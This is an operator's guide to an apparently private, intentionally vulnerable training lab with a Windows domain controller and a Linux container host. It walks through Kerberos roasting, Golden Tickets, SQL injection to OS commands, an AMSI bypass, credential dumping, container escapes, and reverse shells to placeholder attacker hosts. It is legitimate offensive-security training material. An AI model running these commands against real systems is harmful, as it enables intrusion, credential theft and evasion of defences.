# 📓 MODERN KILL LAB // OPERATOR'S FIELD GUIDE

---

## 🌐 NETWORK TOPOLOGY

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                          psycholab (Internal Network)                         ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║   ┌─────────────────────────┐              ┌─────────────────────────┐       ║
║   │       Lab-DC01          │              │       Lab-Web01         │       ║
║   │       10.0.0.10         │◄────────────►│       10.0.0.20         │       ║
║   │                         │   DOMAIN     │                         │       ║
║   │   Windows Server 2022   │    TRUST     │      Debian 12          │       ║
║   │   Domain Controller     │              │   Domain-Joined         │       ║
║   │   Certificate Authority │              │   Container Host        │       ║
║   │   SQL Server            │              │   Kubernetes (K3s)      │       ║
║   │   Web Server (XAMPP)    │              │   Web Applications      │       ║
║   └─────────────────────────┘              └─────────────────────────┘       ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

---

## 🔑 CREDENTIALS

### Domain Accounts (LAB.local)

| Account | Password | Notes |
|---------|----------|-------|
| `LAB\vagrant` | `Vagrant!123` | Domain Admin |
| `LAB\Administrator` | `Vagrant!123` | Domain Admin |
| `LAB\svc_sql` | `Password123!` | Kerberoastable, SQL sysadmin |
| `LAB\svc_backup` | `Backup2024!` | AS-REP Roastable |
| `LAB\helpdesk` | `Help123!` | Standard user |
| `krbtgt` | `GodMode123!` | Golden Ticket target |

### Hidden Credentials (Discovery Required)

| Location | Value |
|----------|-------|
| Azure AD Sync XML | `Valhalla123!` (Base64 encoded) |
| Credential Manager | `LAB\backup_admin` : `BackupP@ss123!` |
| Linux .env file | Fake API keys |

### Linux Accounts

| Account | Password |
|---------|----------|
| `vagrant` | `vagrant` |
| `LAB\vagrant` | `Vagrant!123` |

### Other Passwords

| Item | Password |
|------|----------|
| DSRM Safe Mode | `Vulnerable123!` |

---

## 🔧 QUICK ACCESS

### Web Services

| Service | URL |
|---------|-----|
| AD CS Web Enrollment | http://10.0.0.10/certsrv |
| HR Portal (SQLi) | http://10.0.0.10:8080/hr_portal |
| AI Agent | http://10.0.0.20:5000 |
| Juice Shop | http://10.0.0.20:3000 |
| vAPI | http://10.0.0.20:5002 |

### Remote Access

```bash
# DC01 - RDP
xfreerdp /v:10.0.0.10 /u:LAB\\vagrant /p:'Vagrant!123'

# DC01 - WinRM
evil-winrm -i 10.0.0.10 -u vagrant -p 'Vagrant!123'

# Web01 - SSH (local)
ssh vagrant@10.0.0.20

# Web01 - SSH (domain)
ssh LAB\\vagrant@10.0.0.20

# Web01 - SMB (anonymous)
smbclient //10.0.0.20/backup_drop -N
```

---

## 📁 DIRECTORY STRUCTURE

### DC01 (Windows)

```
C:\Tools\
├── AMSILab\
│   └── vuln.ps1              # AMSI bypass lab
├── VEHLab\
│   ├── FakeEDR.cs            # Source
│   └── FakeEDR.exe           # Compiled EDR
├── CredLab\
│   ├── SAM.bak               # SAM hive backup
│   ├── SYSTEM.bak            # SYSTEM hive backup
│   └── SECURITY.bak          # SECURITY hive backup
├── LOLBinLab\
│   └── payload.csproj        # MSBuild payload
└── PersistenceLab\

C:\Program Files\Azure AD Sync\
└── connection.xml            # Fake cloud credentials

C:\xampp\htdocs\hr_portal\
└── index.php                 # SQL Injection vulnerability
```

### Web01 (Linux)

```
/home/vagrant/
├── ai_agent/
│   └── app.py                # Vulnerable Flask app
├── container_lab/
│   └── docker-compose-vuln.yml
├── k8s_lab/
│   └── vuln.yaml             # Overprivileged ServiceAccount
├── exfil_lab/
│   └── .env                  # Hardcoded secrets
├── share/                    # SMB writable share
├── crapi/
│   └── docker-compose.yml
└── .kube/
    └── config                # K3s kubeconfig
```

---

# 🎯 TARGET ALPHA: Lab-DC01 EXPLOITATION

---

## VULN 1: AS-REP Roasting

### What It Is
When a user account has "Do not require Kerberos preauthentication" enabled, anyone can request an encrypted TGT for that account without providing a password. This TGT can then be cracked offline.

### Why It Works
Kerberos preauthentication normally requires the client to prove they know the password before the KDC issues a TGT. When disabled, the KDC blindly returns an encrypted ticket that attackers can crack at their leisure.

### Configuration
- **Account:** `svc_backup`
- **Setting:** `DONT_REQUIRE_PREAUTH` flag (UAC 4194304)

### Exploitation

```bash
# Request AS-REP hash (no credentials needed)
GetNPUsers.py LAB.local/svc_backup -no-pass -dc-ip 10.0.0.10 -format hashcat -outputfile asrep.hash

# Crack with hashcat
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

### Result
**Password:** `Backup2024!`

### Tools
- Impacket `GetNPUsers.py`
- Rubeus
- hashcat

---

## VULN 2: Kerberoasting

### What It Is
Service accounts with SPNs (Service Principal Names) can have their TGS tickets requested by any authenticated user. These tickets are encrypted with the service account's password hash and can be cracked offline.

### Why It Works
Any authenticated domain user can request a TGS for any SPN. The ticket is encrypted with the service account's NTLM hash. Weak passwords make these trivially crackable.

### Configuration
- **Account:** `svc_sql`
- **SPN:** `MSSQLSvc/dc01.lab.local:1433`

### Exploitation

```bash
# Enumerate SPNs and request tickets
GetUserSPNs.py LAB.local/helpdesk:Help123! -dc-ip 10.0.0.10 -request -outputfile tgs.hash

# Crack with hashcat
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```

### Result
**Password:** `Password123!`

### Tools
- Impacket `GetUserSPNs.py`
- Rubeus
- hashcat

---

## VULN 3: Golden Ticket

### What It Is
A Golden Ticket is a forged Kerberos TGT that grants unlimited access to the entire domain. It's created using the `krbtgt` account's password hash.

### Why It Works
The `krbtgt` account encrypts all TGTs in the domain. If you know its password/hash, you can forge tickets for any user with any privileges, and they'll be trusted by all domain services.

### Configuration
- **Account:** `krbtgt`
- **Password:** `GodMode123!`

### Exploitation

```bash
# Get domain SID
lookupsid.py LAB.local/helpdesk:Help123!@10.0.0.10

# Convert password to NTLM (or use mimikatz lsadump)
# NTLM of GodMode123! = [calculate with python or use secretsdump]

# Forge Golden Ticket
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain lab.local Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass lab.local/Administrator@dc01.lab.local
```

### Result
**Full domain compromise** with forged Administrator ticket.

### Tools
- Impacket `ticketer.py`, `lookupsid.py`
- Mimikatz

---

## VULN 4: AD CS ESC8 (NTLM Relay to HTTP Enrollment)

### What It Is
AD Certificate Services Web Enrollment accepts NTLM authentication over HTTP without Extended Protection for Authentication (EPA). This allows attackers to relay captured NTLM authentication to request certificates.

### Why It Works
When a machine or user authenticates via NTLM, that authentication can be relayed to another service. AD CS Web Enrollment on HTTP is a prime target because a certificate can then be used to authenticate as the relayed identity.

### Configuration
- **URL:** `http://10.0.0.10/certsrv`
- **Issue:** HTTP (not HTTPS), no EPA

### Exploitation

```bash
# Terminal 1: Start relay to AD CS
ntlmrelayx.py -t http://10.0.0.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Terminal 2: Coerce authentication (e.g., via PetitPotam or SQLi)
python3 PetitPotam.py ATTACKER_IP 10.0.0.10

# Or trigger via SQL Injection:
# http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC xp_cmdshell 'dir \\ATTACKER_IP\share'--

# Use obtained certificate
Rubeus.exe asktgt /user:DC01$ /certificate:cert.pfx /ptt
```

### Result
**Certificate for DC machine account** → DCSync or full domain compromise.

### Tools
- Impacket `ntlmrelayx.py`
- PetitPotam
- Coercer
- Rubeus

---

## VULN 5: SQL Injection

### What It Is
The HR Portal web application concatenates user input directly into SQL queries without sanitization, allowing attackers to inject arbitrary SQL commands.

### Why It Works
The PHP code does:
```php
$sql = "SELECT Name, Salary FROM Employees WHERE ID = " . $id;
```
No prepared statements, no input validation.

### Configuration
- **URL:** `http://10.0.0.10:8080/hr_portal/index.php?id=1`
- **Database:** HR_DB on SQL Server Express

### Exploitation

```bash
# Test for injection
curl "http://10.0.0.10:8080/hr_portal/index.php?id=1'"
# Error = injectable

# Union-based data extraction
curl "http://10.0.0.10:8080/hr_portal/index.php?id=-1 UNION SELECT name,password_hash FROM sys.sql_logins--"

# Enable xp_cmdshell (svc_sql is sysadmin)
curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC sp_configure 'show advanced options',1;RECONFIGURE--"
curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--"

# Execute OS commands
curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC xp_cmdshell 'whoami'--"

# Automated exploitation
sqlmap -u "http://10.0.0.10:8080/hr_portal/index.php?id=1" --os-shell
```

### Result
**OS command execution** as the SQL Server service account.

### Tools
- SQLMap
- Burp Suite
- curl

---

## VULN 6: Weak SQL Service Permissions

### What It Is
The `svc_sql` service account is a member of the SQL Server `sysadmin` role, giving it complete control over the database server including the ability to execute operating system commands.

### Why It Works
SQL Server's `sysadmin` role can enable and use `xp_cmdshell` to run arbitrary commands on the underlying Windows system.

### Configuration
- **Account:** `LAB\svc_sql`
- **Role:** `sysadmin` in SQL Server

### Exploitation
Once you have `svc_sql` credentials (via Kerberoasting):

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker Password123! /add';
EXEC xp_cmdshell 'net localgroup Administrators hacker /add';
```

### Result
**Local administrator** on DC01.

---

## VULN 7: Fake Cloud Credentials

### What It Is
A simulated Azure AD Connect installation stores credentials in a configuration file with easily reversible encoding.

### Why It Works
Many cloud sync tools store credentials locally for service authentication. Weak encryption or encoding makes them trivially recoverable.

### Configuration
- **File:** `C:\Program Files\Azure AD Sync\connection.xml`
- **Encoding:** Base64

### Exploitation

```powershell
# Read the config
type "C:\Program Files\Azure AD Sync\connection.xml"

# Extract and decode
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("VABhAGwAbABoAGEAbABsAGEAMQAyADMAIQ=="))
```

### Result
**Password:** `Valhalla123!`

---

## VULN 8: AMSI Bypass

### What It Is
AMSI (Antimalware Scan Interface) is Windows' mechanism for scanning scripts and memory for malware. The lab has intentionally weakened AMSI registry permissions, allowing users to disable it.

### Why It Works
The AMSI Providers registry key has been given Full Control to BUILTIN\Users, allowing anyone to delete or modify AMSI providers.

### Configuration
- **Registry:** `HKLM:\SOFTWARE\Microsoft\AMSI\Providers`
- **Permissions:** Full Control for Users

### Exploitation

```powershell
# Test AMSI (should be blocked)
'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'

# Bypass via reflection
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Bypass via registry (lab-specific)
Remove-Item "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\*" -Recurse -Force

# Test again (should work now)
'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
```

### Result
**AMSI disabled** - malicious scripts no longer scanned.

---

## VULN 9: VEH/EDR Bypass

### What It Is
A simulated EDR (FakeEDR.exe) uses Vectored Exception Handlers for monitoring. These can be removed or bypassed by malware.

### Configuration
- **Location:** `C:\Tools\VEHLab\FakeEDR.exe`

### Exploitation Concepts
- `RemoveVectoredExceptionHandler()` to unhook
- Clear debug registers (DR0-DR7)
- Direct syscalls to bypass userland hooks

---

## VULN 10: Credential Dumping

### What It Is
Windows stores credentials in multiple locations that can be extracted by attackers with sufficient privileges.

### Configuration
- **SAM/SYSTEM:** Backed up to `C:\Tools\CredLab\`
- **Credential Manager:** Contains saved credentials

### Exploitation

```bash
# From Kali (with extracted hive backups)
secretsdump.py -sam SAM.bak -system SYSTEM.bak -security SECURITY.bak LOCAL

# View Credential Manager (on DC01)
cmdkey /list

# Dump with Mimikatz
mimikatz# sekurlsa::logonpasswords
mimikatz# vault::cred /patch
```

### Result
- NTLM hashes from SAM
- `LAB\backup_admin`:`BackupP@ss123!` from Credential Manager

---

## VULN 11: LOLBin Execution

### What It Is
Living Off the Land Binaries (LOLBins) are legitimate Windows executables that can be abused to execute malicious code while evading security tools.

### Configuration
- **Payload:** `C:\Tools\LOLBinLab\payload.csproj`

### Exploitation

```cmd
# MSBuild execution
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Tools\LOLBinLab\payload.csproj

# Certutil download
certutil -urlcache -split -f http://ATTACKER/payload.exe C:\temp\payload.exe

# MSHTA execution
mshta http://ATTACKER/payload.hta
```

### Result
**Code execution** using signed Microsoft binaries.

---

## VULN 12: Persistence via Scheduled Task

### What It Is
A hidden scheduled task named "WindowsDefenderUpdate" runs PowerShell at logon, demonstrating common persistence techniques.

### Configuration
- **Task:** `WindowsDefenderUpdate`
- **Trigger:** At logon
- **Context:** SYSTEM

### Discovery

```powershell
Get-ScheduledTask -TaskName "WindowsDefenderUpdate" | Format-List *
schtasks /query /tn "WindowsDefenderUpdate" /v
```

---

# 🎯 TARGET BRAVO: Lab-Web01 EXPLOITATION

---

## VULN 13: SMB Remote Code Execution

### What It Is
An SMB share allows anonymous write access, and a cron job executes any shell script placed in it as root every minute.

### Why It Works
The combination of:
1. Anonymous writable SMB share
2. `force user = root` in Samba config
3. Cron job that executes `*.sh` files in the share

### Configuration
- **Share:** `//10.0.0.20/backup_drop`
- **Cron:** Runs `bash` on all `.sh` files every minute, then deletes them

### Exploitation

```bash
# Connect anonymously
smbclient //10.0.0.20/backup_drop -N

# Create reverse shell
echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" > shell.sh

# Upload
smb: \> put shell.sh

# Start listener
nc -lvnp 4444

# Wait ~60 seconds for ROOT shell
```

### Result
**Root shell** on Web01.

### Tools
- smbclient
- netcat

---

## VULN 14: AI Agent Command Injection

### What It Is
A Flask web application passes user input directly to `subprocess.check_output()` with `shell=True`, allowing arbitrary command execution.

### Why It Works
```python
out = subprocess.check_output(q, shell=True, stderr=subprocess.STDOUT)
```
No input validation whatsoever.

### Configuration
- **URL:** `http://10.0.0.20:5000/ask?query=`
- **Service:** Runs as root

### Exploitation

```bash
# Test command execution
curl "http://10.0.0.20:5000/ask?query=id"
# Returns: uid=0(root)...

# Read sensitive files
curl "http://10.0.0.20:5000/ask?query=cat%20/etc/shadow"
curl "http://10.0.0.20:5000/ask?query=cat%20/home/vagrant/.kube/config"

# Reverse shell
nc -lvnp 4444
curl "http://10.0.0.20:5000/ask?query=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/4444%200>%261'"
```

### Result
**Root shell** on Web01.

---

## VULN 15: Kubernetes Privilege Escalation

### What It Is
A ServiceAccount with `cluster-admin` privileges exists in the default namespace, allowing full control over the Kubernetes cluster.

### Why It Works
The `vuln-admin-sa` ServiceAccount is bound to the `cluster-admin` ClusterRole, giving it unrestricted access to all cluster resources.

### Configuration
- **ServiceAccount:** `vuln-admin-sa`
- **ClusterRoleBinding:** `vuln-binding` → `cluster-admin`

### Exploitation

```bash
# Check permissions
kubectl auth can-i --list --as=system:serviceaccount:default:vuln-admin-sa

# Dump all secrets
kubectl get secrets -A -o yaml --as=system:serviceaccount:default:vuln-admin-sa

# Deploy privileged pod
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  serviceAccountName: vuln-admin-sa
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwned
    image: ubuntu
    securityContext:
      privileged: true
    command: ["sleep", "infinity"]
    volumeMounts:
    - mountPath: /host
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
EOF

# Escape to host
kubectl exec -it pwned -- chroot /host bash
```

### Result
**Root on host** via Kubernetes escape.

---

## VULN 16: Privileged Container Escape

### What It Is
A Docker container running with `--privileged` flag has full access to the host's kernel and devices.

### Why It Works
Privileged containers can mount host filesystems and have unrestricted access to devices.

### Configuration
- **Container:** `vuln_priv`

### Exploitation

```bash
# Enter container
docker exec -it container_lab-vuln_priv-1 bash

# Find host disk
fdisk -l

# Mount and escape
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host bash

# Now on host as root
```

### Result
**Root on host**.

---

## VULN 17: Docker Socket Escape

### What It Is
A container with the Docker socket mounted can communicate with the Docker daemon to spawn new privileged containers.

### Why It Works
Access to `/var/run/docker.sock` = Access to Docker daemon = Ability to create containers with host access.

### Configuration
- **Container:** `vuln_sock`
- **Mount:** `/var/run/docker.sock:/var/run/docker.sock`

### Exploitation

```bash
# Enter container
docker exec -it container_lab-vuln_sock-1 bash

# Install docker CLI
apt update && apt install -y docker.io

# Escape via new privileged container
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host

# Now on host as root
```

### Result
**Root on host**.

---

## VULN 18: Sudo Misconfiguration

### What It Is
The `vagrant` user can run `vim` as root without a password, and vim can spawn a shell.

### Why It Works
Vim has the ability to execute shell commands (`:!command`), so passwordless sudo to vim = passwordless root.

### Configuration
- **Sudoers:** `vagrant ALL=(ALL) NOPASSWD: /usr/bin/vim`

### Exploitation

```bash
# Escape via vim
sudo vim -c ':!/bin/bash'

# Alternative
sudo vim
:set shell=/bin/bash
:shell
```

### Result
**Root shell**.

---

## VULN 19: Linux Capabilities Abuse

### What It Is
A copy of Python has the `cap_setuid` capability, allowing it to change its UID to 0 (root).

### Why It Works
Linux capabilities grant specific privileges to executables. `cap_setuid` allows changing the process's user ID.

### Configuration
- **Binary:** `/usr/local/bin/python_cap`
- **Capability:** `cap_setuid+ep`

### Exploitation

```bash
/usr/local/bin/python_cap -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Result
**Root shell**.

---

## VULN 20: Hardcoded Secrets

### What It Is
Configuration files contain hardcoded API keys and credentials.

### Configuration
- **File:** `/home/vagrant/exfil_lab/.env`

### Discovery

```bash
cat /home/vagrant/exfil_lab/.env
# API_KEY=sk_live_1234567890abcdef
# AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE

# Search for more
grep -r "API_KEY\|SECRET\|PASSWORD" /home 2>/dev/null
find / -name "*.env" 2>/dev/null
```

---

## VULN 21: API Security Flaws

### What It Is
Multiple OWASP-style vulnerable APIs are deployed for practicing API security testing.

### Targets
| App | Port | Vulnerabilities |
|-----|------|-----------------|
| Juice Shop | 3000 | XSS, SQLi, Auth bypass |
| vAPI | 5002 | BOLA, Mass Assignment |
| crAPI | 8888 | BOLA, IDOR, JWT issues |

### Exploration

```bash
# Juice Shop
curl http://10.0.0.20:3000

# vAPI
curl http://10.0.0.20:5002

# BOLA example (access other users)
curl http://10.0.0.20:5002/api/users/1
curl http://10.0.0.20:5002/api/users/2  # Different user's data
```

---

# 🛠️ RECOMMENDED TOOLS

| Category | Tools |
|----------|-------|
| AD Attacks | Impacket, Rubeus, Mimikatz, BloodHound |
| Web Testing | Burp Suite, SQLMap, ffuf |
| Linux Privesc | linPEAS, GTFOBins |
| Containers | deepce, kubectl |
| General | netcat, curl, CrackMapExec |

---

# 📚 ATTACK CHAIN SUGGESTIONS

### Path 1: Web → SQLi → OS Command → AD Compromise
1. SQL Injection on HR Portal
2. Enable xp_cmdshell
3. Dump credentials or add user
4. DCSync or Golden Ticket

### Path 2: Kerberos → Domain Admin
1. AS-REP Roast `svc_backup`
2. Kerberoast `svc_sql`
3. Use SQL sysadmin for OS access
4. DCSync with Domain Admin

### Path 3: SMB → Root → Domain
1. Anonymous SMB to `backup_drop`
2. Upload shell script
3. Root shell via cron
4. Use domain credentials from memory

### Path 4: Web → Container → Host
1. AI Agent command injection
2. Enumerate containers
3. Docker socket escape
4. Root on host

---

**Hunt. Adapt. Overcome.** ☠️
